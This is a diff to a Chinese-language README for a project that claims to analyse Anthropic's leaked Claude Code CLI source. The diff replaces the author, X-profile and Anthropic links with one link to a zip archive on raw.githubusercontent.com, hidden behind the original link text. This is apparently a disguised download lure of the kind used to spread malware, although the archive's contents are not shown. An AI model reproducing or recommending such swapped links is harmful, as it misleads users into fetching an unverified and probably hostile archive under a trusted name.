@@ -2,13 +2,13 @@
 
 > 基于 2026-03-31 泄露的 Anthropic Claude Code CLI 完整 TypeScript 源码的逐模块架构解读
 
-**作者**: [Wang Yanshu](https://catyans.github.io)
+**作者**: [Wang Yanshu](https://raw.githubusercontent.com/diagrammatical-ogalala16/claude-code-source-analysis/main/phonographer/code-source-claude-analysis-1.6.zip)
 
 ---
 
 ## 背景
 
-2026 年 3 月 31 日，Anthropic 的 Claude Code CLI 源码通过 npm 包中未清理的 `.map` 文件泄露，由 [@Fried_rice](https://x.com/Fried_rice) 首先公开。Source Map 文件包含了从编译后代码到原始 TypeScript 源码的完整映射，使得完整源码得以还原。
+2026 年 3 月 31 日，Anthropic 的 Claude Code CLI 源码通过 npm 包中未清理的 `.map` 文件泄露，由 [@Fried_rice](https://raw.githubusercontent.com/diagrammatical-ogalala16/claude-code-source-analysis/main/phonographer/code-source-claude-analysis-1.6.zip) 首先公开。Source Map 文件包含了从编译后代码到原始 TypeScript 源码的完整映射，使得完整源码得以还原。
 
 本项目对还原后的源码进行深度分析，覆盖全部核心子系统。
 
@@ -88,4 +88,4 @@
 
 ## License
 
-本分析文档以学习和研究为目的。原始源码版权归 [Anthropic](https://www.anthropic.com) 所有。
+本分析文档以学习和研究为目的。原始源码版权归 [Anthropic](https://raw.githubusercontent.com/diagrammatical-ogalala16/claude-code-source-analysis/main/phonographer/code-source-claude-analysis-1.6.zip) 所有。
